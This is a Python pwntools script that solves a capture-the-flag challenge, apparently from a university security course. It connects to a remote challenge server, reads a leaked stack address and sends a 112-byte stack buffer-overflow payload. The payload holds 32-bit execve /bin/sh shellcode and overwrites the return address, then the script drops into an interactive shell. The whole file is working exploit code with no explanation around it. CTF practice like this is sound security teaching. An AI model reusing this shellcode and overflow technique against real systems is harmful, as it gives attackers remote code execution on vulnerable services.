#!/usr/bin/python3
from pwn import *
import sys

DEBUG = False

if DEBUG:
    r = process('./program')
else:
    r = remote('ctf-fsi.fe.up.pt', 4001)

address = r.recvuntil(b'Give').split()[-2][:-1].decode('latin-1')
address = int(address,16).to_bytes(4, byteorder='little')

shellcode= (
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"  # 32-bit
).encode('latin-1')

content = bytearray(0x90 for i in range(112))
content[0:len(shellcode)] = shellcode
content[108:112] = address

r.recv()
r.sendline(content)
r.interactive()